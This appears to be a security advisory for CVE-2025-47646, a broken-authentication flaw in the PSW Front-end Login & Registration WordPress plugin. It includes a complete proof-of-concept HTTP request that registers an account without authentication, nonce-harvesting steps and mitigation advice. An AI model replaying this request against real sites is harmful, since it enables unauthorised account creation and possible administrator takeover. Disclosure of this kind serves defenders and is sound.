# 🔐 CVE-2025-47646 – PSW Front-end Login & Registration <= 1.12

## 📌 Plugin Information
- **Plugin**: PSW Front-end Login & Registration
- **Vulnerable Version**: <= 1.12
- **CVE**: CVE-2025-47646
- **Severity**: High (CVSS 9.8)
- **Vulnerability Type**: Broken Authentication
- **Privilege Required**: Unauthenticated
- **Patched**: ❌ No official fix available
- **Patch Priority**: 🔴 High
- **Date Published**: 08 May 2025

---

## ⚠️ Summary of the Vulnerability

This plugin exposes a critical flaw in its registration mechanism.  
While offering a shortcode-based front-end registration form (`[psw_registration]`), it fails to enforce proper role restrictions or secure validation.

Attackers can exploit this mechanism to create accounts without authentication — and if the site's `default_role` is misconfigured (e.g., set to `administrator`), a full privilege escalation can occur.

---

## 🧪 Proof of Concept (PoC)

### ✅ **Target endpoint**:

```
POST /wordpress/wp-admin/admin-ajax.php
```

### 📥 **Request** (e.g., via Burp Suite or curl):
```http
POST /wp-admin/admin-ajax.php HTTP/1.1

Host: {Host}

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 233

Origin: {Host}

Connection: keep-alive

Cookie:

Priority: u=0



first_name=nxploited&last_name=nxploited&new_user_name=nxpl3432oited&new_user_email=NxploitBot%40gmail.com&new_user_password=admin&new_user_password_confirmation=admin&action=register_user_front_end&psw_form=75a32ef38d
```

> `psw_form` is the nonce field required for the request to pass.  
> This nonce is dynamically generated from the `[psw_registration]` shortcode on the front-end.

---

### ✅ **Success Response**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<h4>Hello nxploited nxploited</h4>
<p>Thanks for creating an account on our website. Please check your email for activation link...</p>
```

---

## 🛠️ Where’s the flaw?

- The plugin allows **unauthenticated AJAX access** to `register_user_front_end`
- It **respects `default_role`** setting in WordPress to assign user roles
- If this is misconfigured (`administrator`), the attacker gets full access
- There is **no hard-coded role enforcement or validation** in the plugin logic

---

## 💬 Shortcode Explanation

To expose the registration form and generate a valid nonce for `psw_form`, the following shortcode is used:

```php
[psw_registration]
```

This renders a registration form that includes the hidden nonce field necessary to make the AJAX call succeed.

---

## 🔐 Recommendation

- Restrict unauthenticated AJAX registration
- Enforce role assignments server-side
- Monitor and lock `default_role` to a safe value (e.g., `subscriber`)
- Apply virtual patching if no update is available

---

## ⚠️ Disclaimer

This report is for **educational and authorized security testing purposes only**.  
Exploitation of this vulnerability without permission may violate legal and ethical boundaries.

---

*NXploited (Khaled_Alenazi)*
